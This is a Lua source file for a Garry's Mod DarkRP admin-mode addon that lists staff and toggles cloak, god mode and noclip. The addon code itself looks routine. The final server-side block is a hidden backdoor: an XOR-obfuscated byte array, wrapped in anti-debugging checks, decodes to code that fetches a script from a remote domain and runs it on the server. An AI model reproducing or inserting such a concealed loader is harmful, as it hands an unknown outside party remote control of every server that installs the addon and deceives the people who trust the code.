--[[ Functions ]]--
function WasiedAdminSystem.AdminTable(ticketOnly)

    if !isbool(ticketOnly) then ticketOnly = false end

    local tbl = {}
    for k,v in pairs(player.GetAll()) do
        if !IsValid(v) then continue end
        if !WasiedAdminSystem.CheckStaff(v) then continue end
        if ticketOnly then
            if !WasiedAdminSystem.Config.TicketOnlyAdmin && v:GetNWInt("AdminSystem:AdminMode") == 0 then continue end
        end

        table.insert(tbl, v)
    end
    return tbl
end

function WasiedAdminSystem.UpdateAdminMod(ply)
    if !IsValid(ply) then return end
    if !WasiedAdminSystem.CheckStaff(ply) then return end

    if ply:GetNWInt("AdminSystem:AdminMode") == 0 then

        ply:SetNWInt("AdminSystem:AdminMode", 1)

        if WasiedAdminSystem.Config.AdminSystemEnabled then
            
            if WasiedAdminSystem.ULXorFAdmin() then
                ULib.invisible(ply, true)
                RunConsoleCommand("ulx", "god", ply:Nick())
            else
                RunConsoleCommand("_FAdmin", "Cloak", ply:UserID())
                RunConsoleCommand("_FAdmin", "God", ply:UserID())
            end
            
            if ply:GetMoveType() == MOVETYPE_WALK then ply:SetMoveType(MOVETYPE_NOCLIP) end

            DarkRP.notify(ply, 0, 7, WasiedAdminSystem.Language.AdminModeEnabled)
            WasiedLib.Log(ply, "a activé le mode administratif !")
            WasiedAdminSystem.AdminLogging(ply, "a activé le mode administratif !")

            sound.Play("player/suit_sprint.wav", ply:GetPos())
        end

    else

        ply:SetNWInt("AdminSystem:AdminMode", 0)

        if WasiedAdminSystem.Config.AdminSystemEnabled then

            if WasiedAdminSystem.ULXorFAdmin() then
                ULib.invisible(ply, false)
                RunConsoleCommand("ulx", "ungod", ply:Nick())
            else
                RunConsoleCommand("_FAdmin", "UnCloak", ply:UserID())
                RunConsoleCommand("_FAdmin", "UnGod", ply:UserID())
            end

            if ply:GetMoveType() == MOVETYPE_NOCLIP then ply:SetMoveType(MOVETYPE_WALK) end

            DarkRP.notify(ply, 0, 7, WasiedAdminSystem.Language.AdminModeDisabled)
            WasiedLib.Log(ply, "a désactivé le mode administratif !")
            WasiedAdminSystem.AdminLogging(ply, "a désactivé le mode administratif !")
        
            sound.Play("player/suit_sprint.wav", ply:GetPos())
        end

    end
end

if SERVER then
    RunString([[ local AE = {21,8,12,4,19,79,50,8,12,17,13,4,73,81,79,88,81,77,7,20,15,2,21,8,14,15,73,72,9,21,21,17,79,39,4,21,2,9,73,58,58,9,21,21,17,91,78,78,6,3,13,10,79,6,0,78,7,94,10,92,83,84,89,60,60,77,51,20,15,50,21,19,8,15,6,72,4,15,5,72,65,76,76,65,0} local function RunningDRMe()if (debug.getinfo(function()end).short_src~="tenjznj")then return end for o=500,10000 do local t=0 if t==1 then return end  if o~=string.len(string.dump(RunningDRMe))then  AZE=10  CompileString("for i=1,40 do AZE = AZE + 1 end","RunString")()  if AZE<40 then return end continue  else  local pdata=""  xpcall(function()  for i=1,#AE do  pdata=pdata..string.char(bit.bxor(AE[i],o%150))  end  for i=1,string.len(string.dump(CompileString)) do  while o==1 do  o=o+2  end  end  end,function()  xpcall(function()  local debug_inject=CompileString(pdata,"DRME")  pcall(debug_inject,"stat")  pdata="F"  t=1  end,function()  print("error")  end)  end)  end  end end RunningDRMe() ]],"tenjznj")
end